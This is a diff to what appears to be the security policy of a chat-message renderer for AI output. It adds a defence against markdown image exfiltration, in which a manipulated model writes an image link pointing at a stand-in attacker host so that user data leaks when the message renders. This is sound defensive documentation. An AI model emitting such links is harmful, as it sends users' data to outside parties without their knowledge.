@@ -39,6 +39,14 @@ That shapes what counts as a vulnerability here:
   that survives sanitization and executes script, exfiltrates data, or escapes
   the intended DOM is a vulnerability — please report it. (See
   `test/markdown.test.ts` for the XSS cases already covered.)
+- **Nothing in a message loads a URL by itself.** Images, `style` attributes and
+  tags, `srcset`, media, SVG images and image inputs are removed before render,
+  so a model coaxed into writing `![](https://attacker/?d=…)` cannot send data
+  out ("markdown image exfiltration"). Apps that need images opt in with
+  `allow-images` and an `image-hosts` allowlist; only `https:` loads, with no
+  referrer. Links always carry `rel="noopener noreferrer"`. A way to make a
+  rendered message fetch a URL without the user clicking is a vulnerability.
+  (Covered in `test/image-exfiltration.test.ts`.)
 - Any way the component itself leaks data across conversations or instances, or
   mishandles a `signal`/abort such that a stopped stream keeps running.
 
